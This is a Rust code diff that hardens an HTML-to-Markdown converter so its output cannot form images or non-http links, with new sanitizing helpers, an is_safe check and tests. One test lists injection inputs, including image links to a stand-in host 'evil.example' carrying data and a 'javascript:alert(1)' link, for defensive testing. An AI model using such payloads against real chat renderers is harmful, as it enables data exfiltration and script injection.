@@ -8,6 +8,7 @@
 //! dropped. Code spans, fenced blocks and the mention tokens are never touched.
 
 use pulldown_cmark::{BlockQuoteKind, CodeBlockKind, Event, Options, Parser, Tag};
+use std::ops::Range;
 
 fn options() -> Options {
     Options::ENABLE_TABLES
@@ -32,8 +33,9 @@ fn alert_label(k: BlockQuoteKind) -> &'static str {
 #[derive(Default)]
 struct Html {
     hrefs: Vec<Option<String>>,
+    /// Emphasis markers whose opening tag was converted (so its closing tag is too).
+    open: Vec<String>,
     lists: Vec<Option<u32>>,
-    in_pre: bool,
     in_cell: bool,
     in_table: bool,
     rows: u32,
@@ -57,8 +59,90 @@ fn attr(tag: &str, name: &str) -> Option<String> {
     }
 }
 
+/// Characters that start Markdown in text that is not Markdown (the text of an HTML block).
+fn escape_text(s: &str) -> String {
+    let mut out = String::with_capacity(s.len() + 4);
+    for c in s.chars() {
+        if matches!(
+            c,
+            '\\' | '`' | '*' | '_' | '[' | ']' | '(' | ')' | '<' | '>' | '!' | '|' | '~' | '$'
+        ) {
+            out.push('\\');
+        }
+        out.push(c);
+    }
+    out
+}
+
+/// Break every `![` of Markdown that is carried over as it is (a footnote's text): what the core
+/// refused to let form must not form here either.
+fn break_image_openers(s: &str) -> String {
+    s.replace("![", "!\\[")
+}
+
+/// A code span that holds `inner` literally: the delimiter is longer than any backtick run in it.
+fn code_span(inner: &str) -> String {
+    let run = inner
+        .split(|c| c != '`')
+        .map(str::len)
+        .max()
+        .unwrap_or_default();
+    let d = "`".repeat(run + 1);
+    let pad = if inner.starts_with('`') || inner.ends_with('`') {
+        " "
+    } else {
+        ""
+    };
+    format!("{d}{pad}{inner}{pad}{d}")
+}
+
+/// A fenced block that holds `inner` literally: the fence is longer than any backtick run in it.
+fn code_fence(inner: &str) -> String {
+    let run = inner
+        .split(|c| c != '`')
+        .map(str::len)
+        .max()
+        .unwrap_or_default();
+    let f = "`".repeat((run + 1).max(3));
+    format!("\n\n{f}\n{}\n{f}\n\n", inner.trim_matches('\n'))
+}
+
+/// Link destinations that cannot end the destination early.
+fn dest(href: &str) -> String {
+    href.replace('(', "%28").replace(')', "%29")
+}
+
+/// `text` as a link label: brackets cannot close it (nor open an image after a `!`).
+fn escape_label(s: &str) -> String {
+    s.replace('[', "\\[").replace(']', "\\]")
+}
+
+/// The name of a tag (`<B class=x>` → `b`) and whether it is a closing tag.
+fn tag_name(raw: &str) -> (bool, String) {
+    let inner = raw.trim_start_matches('<');
+    let (closing, inner) = inner
+        .strip_prefix('/')
+        .map_or((false, inner), |r| (true, r));
+    let name = inner
+        .chars()
+        .take_while(char::is_ascii_alphanumeric)
+        .collect::<String>()
+        .to_ascii_lowercase();
+    (closing, name)
+}
+
+/// The marker an inline emphasis tag converts to.
+fn mark(name: &str) -> Option<&'static str> {
+    match name {
+        "b" | "strong" => Some("**"),
+        "i" | "em" => Some("_"),
+        "s" | "del" => Some("~~"),
+        _ => None,
+    }
+}
+
 impl Html {
-    fn tag(&mut self, raw: &str, out: &mut String) {
+    fn tag(&mut self, raw: &str, rest: &str, out: &mut String) {
         let inner = raw
             .trim_start_matches('<')
             .trim_end_matches('>')
@@ -72,32 +156,37 @@ impl Html {
             .collect::<String>()
             .to_ascii_lowercase();
         match (name.as_str(), closing) {
-            ("b" | "strong", _) => out.push_str("**"),
-            ("i" | "em", _) => out.push('_'),
-            ("s" | "del", _) => out.push_str("~~"),
-            ("code" | "kbd", _) if !self.in_pre => out.push('`'),
-            ("pre", false) => {
-                self.in_pre = true;
-                out.push_str("\n\n```\n");
+            // Emphasis only when the tag is paired: an unpaired marker would reach out into
+            // the Markdown around it.
+            (n, false) if mark(n).is_some() => {
+                let closes = rest.to_ascii_lowercase().contains(&format!("</{n}"));
+                if closes && let Some(m) = mark(n) {
+                    out.push_str(m);
+                    self.open.push(n.to_owned());
+                }
             }
-            ("pre", true) => {
-                self.in_pre = false;
-                out.push_str("\n```\n\n");
+            (n, true) if mark(n).is_some() => {
+                if let Some(at) = self.open.iter().rposition(|o| o == n) {
+                    self.open.remove(at);
+                    out.push_str(mark(n).unwrap_or_default());
+                }
             }
             ("br", _) => out.push_str("  \n"),
             ("hr", _) => out.push_str("\n\n---\n\n"),
             ("a", false) => {
                 // The core keeps an `href` only for http, https and mailto; without one the
-                // label stays and the tag goes.
-                let href = attr(inner, "href");
-                if href.is_some() {
-                    out.push('[');
+                // label stays and the tag goes. Only a paired tag becomes a link.
+                if rest.to_ascii_lowercase().contains("</a") {
+                    let href = attr(inner, "href");
+                    if href.is_some() {
+                        out.push('[');
+                    }
+                    self.hrefs.push(href);
                 }
-                self.hrefs.push(href);
             }
             ("a", true) => {
                 if let Some(Some(h)) = self.hrefs.pop() {
-                    out.push_str(&format!("]({h})"));
+                    out.push_str(&format!("]({})", dest(&h)));
                 }
             }
             ("summary", false) => out.push_str("\n\n**"),
@@ -173,10 +262,12 @@ impl Html {
         if (!self.lists.is_empty() || self.in_table) && t.trim().is_empty() {
             return;
         }
+        // The text of an HTML block is not Markdown: it is shown as typed.
+        let t = escape_text(t);
         if self.in_cell {
-            out.push_str(&t.replace('\n', " ").replace('|', "\\|"));
+            out.push_str(&t.replace('\n', " "));
         } else {
-            out.push_str(t);
+            out.push_str(&t);
         }
     }
 
@@ -189,8 +280,34 @@ impl Html {
             let tail = &rest[p..];
             match tail.find('>') {
                 Some(e) if tail[1..].starts_with(|c: char| c.is_ascii_alphabetic() || c == '/') => {
-                    self.tag(&tail[..=e], &mut out);
-                    rest = &tail[e + 1..];
+                    let raw = &tail[..=e];
+                    let after = &tail[e + 1..];
+                    let (closing, name) = tag_name(raw);
+                    // Code is literal: `<code>…</code>`, `<kbd>…</kbd>` and `<pre>…</pre>` hold their
+                    // text as typed (tags inside are dropped); an unpaired opener is dropped.
+                    if !closing && matches!(name.as_str(), "code" | "kbd" | "pre") {
+                        let lower = after.to_ascii_lowercase();
+                        match lower.find(&format!("</{name}")) {
+                            Some(c) => {
+                                let literal = strip_tags(&after[..c]);
+                                if name == "pre" {
+                                    out.push_str(&code_fence(&literal));
+                                } else {
+                                    out.push_str(&code_span(&literal));
+                                }
+                                rest = after[c..].find('>').map_or("", |g| &after[c + g + 1..]);
+                            }
+                            None => rest = after,
+                        }
+                        continue;
+                    }
+                    // A stray closing tag of code is dropped.
+                    if closing && matches!(name.as_str(), "code" | "kbd" | "pre") {
+                        rest = after;
+                        continue;
+                    }
+                    self.tag(raw, after, &mut out);
+                    rest = after;
                 }
                 _ => {
                     self.text("<", &mut out);
@@ -201,6 +318,92 @@ impl Html {
         self.text(rest, &mut out);
         out
     }
+}
+
+/// The last-line check of `render_text`: no image, no link outside `http`/`https`/`mailto`, and
+/// no image opener (`![`, which Mattermost's own dialect — `![x](url =10x10)`, a definition
+/// that interrupts a paragraph — can complete) outside code.
+pub fn is_safe(text: &str) -> bool {
+    use pulldown_cmark::{LinkType, TagEnd};
+    let mut in_code = false;
+    for (e, r) in Parser::new_ext(text, options()).into_offset_iter() {
+        match e {
+            Event::Start(Tag::CodeBlock(_)) => in_code = true,
+            Event::End(TagEnd::CodeBlock) => in_code = false,
+            Event::Start(Tag::Image { .. }) => return false,
+            Event::Start(Tag::Link {
+                dest_url,
+                link_type,
+                ..
+            }) if !matches!(link_type, LinkType::Email) => {
+                let l = dest_url.to_ascii_lowercase();
+                if !(l.starts_with("http:") || l.starts_with("https:") || l.starts_with("mailto:"))
+                {
+                    return false;
+                }
+            }
+            Event::Text(_)
+            | Event::InlineMath(_)
+            | Event::DisplayMath(_)
+            | Event::Html(_)
+            | Event::InlineHtml(_)
+                if !in_code && text[r.clone()].contains("![") =>
+            {
+                return false;
+            }
+            _ => {}
+        }
+    }
+    true
+}
+
+/// The index of the closing tag that pairs with the opening tag `name` at `evs[i]`, within the
+/// same inline run (a paragraph, a cell): nesting of the same name counts.
+fn find_close(evs: &[(Event<'_>, Range<usize>)], i: usize, name: &str) -> Option<usize> {
+    let mut depth = 0usize;
+    let mut nest = 0usize;
+    for (k, (e, _)) in evs.iter().enumerate().skip(i + 1) {
+        match e {
+            Event::Start(_) => depth += 1,
+            Event::End(_) => {
+                if depth == 0 {
+                    return None;
+                }
+                depth -= 1;
+            }
+            _ => {
+                if depth == 0
+                    && let Event::InlineHtml(h) = e
+                    && let (closing, n) = tag_name(h)
+                    && n == name
+                {
+                    if !closing {
+                        nest += 1;
+                    } else if nest == 0 {
+                        return Some(k);
+                    } else {
+                        nest -= 1;
+                    }
+                }
+            }
+        }
+    }
+    None
+}
+
+/// `s` without its tags (the text of a stretch of HTML).
+fn strip_tags(s: &str) -> String {
+    let mut out = String::with_capacity(s.len());
+    let mut in_tag = false;
+    for c in s.chars() {
+        match c {
+            '<' => in_tag = true,
+            '>' if in_tag => in_tag = false,
+            c if !in_tag => out.push(c),
+            _ => {}
+        }
+    }
+    out
 }
 
 fn first_line_end(s: &str) -> usize {
@@ -214,7 +417,13 @@ pub fn convert(neutral: &str) -> String {
     let mut defs: Vec<(String, String)> = Vec::new();
     let mut html = Html::default();
     let mut consumed = 0usize;
-    for (ev, r) in Parser::new_ext(neutral, options()).into_offset_iter() {
+    // Closing tags of converted emphasis/link tags, by source offset → what they become.
+    let mut closers: std::collections::HashMap<usize, String> = std::collections::HashMap::new();
+    let evs: Vec<(Event<'_>, Range<usize>)> = Parser::new_ext(neutral, options())
+        .into_offset_iter()
+        .collect();
+    for (i, (ev, r)) in evs.iter().enumerate() {
+        let (ev, r) = (ev.clone(), r.clone());
         if r.start < consumed {
             continue;
         }
@@ -239,7 +448,8 @@ pub fn convert(neutral: &str) -> String {
                         text.push_str(l.trim());
                     }
                 }
-                defs.push((label.to_string(), text));
+                // The text is flattened into a list item: nothing in it may open an image.
+                defs.push((label.to_string(), break_image_openers(&text)));
                 // Remove the whole definition (and the blank line after it).
                 edits.push((r.start, r.end, String::new()));
                 consumed = r.end;
@@ -292,8 +502,66 @@ pub fn convert(neutral: &str) -> String {
                 consumed = r.end;
             }
             Event::InlineHtml(_) => {
-                let c = html.convert(&neutral[r.clone()]);
-                edits.push((r.start, r.end, c));
+                let raw = &neutral[r.clone()];
+                let (closing, name) = tag_name(raw);
+                if closing {
+                    // A closer that belongs to an opener we converted is handled with it
+                    // (`closers`); a stray one is dropped.
+                    let rep = closers.remove(&r.start).unwrap_or_default();
+                    edits.push((r.start, r.end, rep));
+                } else if matches!(name.as_str(), "code" | "kbd") {
+                    // Code is literal: the pair becomes one code span around the source text
+                    // between the tags, however many backticks it holds. Unpaired: dropped.
+                    match find_close(&evs, i, &name) {
+                        Some(k) => {
+                            let end = evs[k].1.end;
+                            let inner = strip_tags(&neutral[r.end..evs[k].1.start]);
+                            edits.push((r.start, end, code_span(&inner)));
+                            consumed = end;
+                        }
+                        None => edits.push((r.start, r.end, String::new())),
+                    }
+                } else if name == "a" {
+                    match (find_close(&evs, i, &name), attr(raw, "href")) {
+                        (Some(k), Some(href)) => {
+                            let end = evs[k].1.end;
+                            let inner = &neutral[r.end..evs[k].1.start];
+                            // After a `!` a link would be an image: keep them apart.
+                            let apart = if neutral[..r.start].ends_with('!') {
+                                "\u{200B}"
+                            } else {
+                                ""
+                            };
+                            edits.push((
+                                r.start,
+                                end,
+                                format!(
+                                    "{apart}[{}]({})",
+                                    escape_label(&convert(inner)),
+                                    dest(&href)
+                                ),
+                            ));
+                            consumed = end;
+                        }
+                        (Some(k), None) => {
+                            // No usable href: the label stays, the tags go.
+                            closers.insert(evs[k].1.start, String::new());
+                            edits.push((r.start, r.end, String::new()));
+                        }
+                        (None, _) => edits.push((r.start, r.end, String::new())),
+                    }
+                } else if let Some(m) = mark(&name) {
+                    match find_close(&evs, i, &name) {
+                        Some(k) => {
+                            closers.insert(evs[k].1.start, m.to_owned());
+                            edits.push((r.start, r.end, m.to_owned()));
+                        }
+                        None => edits.push((r.start, r.end, String::new())),
+                    }
+                } else {
+                    let c = html.convert(raw);
+                    edits.push((r.start, r.end, c));
+                }
             }
             _ => {}
         }
@@ -416,6 +684,56 @@ mod tests {
             "<table>\n<tr><th>A</th><th>B</th></tr>\n<tr><td>1</td><td>x|y</td></tr>\n</table>\n",
         );
         assert_eq!(t.trim(), "| A | B | \n|---|---|\n| 1 | x\\|y |");
+    }
+
+    /// FIX-142 review: the converter alone (the last-line check not involved) must not turn text
+    /// the core let through into an image or a bad link.
+    #[test]
+    fn conversion_never_manufactures_an_image_or_a_bad_link() {
+        let s = "https://evil.example/?d=S";
+        for src in [
+            format!("!<a href=\"{s}\">x</a>"),
+            format!("<div>\n![x]({s})\n</div>"),
+            format!("<span>![x]({s})</span>"),
+            format!("x<code>`![a]({s})`"),
+            format!("<pre>\n```\n![x]({s})\n</pre>"),
+            "<a href=\"https://ok.example\">x](javascript:alert(1))</a>".to_owned(),
+            format!("see[^a]\n\n[^a]: note\n\n        ![x]({s})"),
+            format!("<b>![x]({s})"),
+            format!("<a href=\"{s}\">![x]({s})</a>"),
+        ] {
+            let neutral = aurora_core::sanitize::markdown_safe(&src, 10_000);
+            let out = convert(&neutral);
+            assert!(super::is_safe(&out), "{src:?} -> {neutral:?} -> {out:?}");
+        }
+    }
+
+    #[test]
+    fn html_pairs_convert_and_unpaired_tags_are_dropped() {
+        assert_eq!(convert("a <code>x</code> b\n"), "a `x` b\n");
+        assert_eq!(convert("a <code>x`y</code> b\n"), "a ``x`y`` b\n");
+        assert_eq!(convert("a <code>x b\n"), "a x b\n");
+        assert_eq!(convert("a <b>x b\n"), "a x b\n");
+        assert_eq!(convert("a </b>x b\n"), "a x b\n");
+        assert_eq!(convert("a <b>x</b> <i>y</i>\n"), "a **x** _y_\n");
+        assert_eq!(
+            convert("<a href=\"https://x.example/a(b)\">[l]</a>\n"),
+            "[\\[l\\]](https://x.example/a%28b%29)\n"
+        );
+        assert_eq!(
+            convert("!<a href=\"https://x.example\">x</a>\n"),
+            "!\u{200B}[x](https://x.example)\n"
+        );
+    }
+
+    #[test]
+    fn the_text_of_an_html_block_is_shown_as_typed() {
+        let out = convert("<div>*not emphasis* and [not](a link)</div>\n");
+        assert!(out.contains("\\*not emphasis\\*"), "{out}");
+        assert!(
+            !out.contains("](a link)") || out.contains("\\]\\(a link\\)"),
+            "{out}"
+        );
     }
 
     #[test]
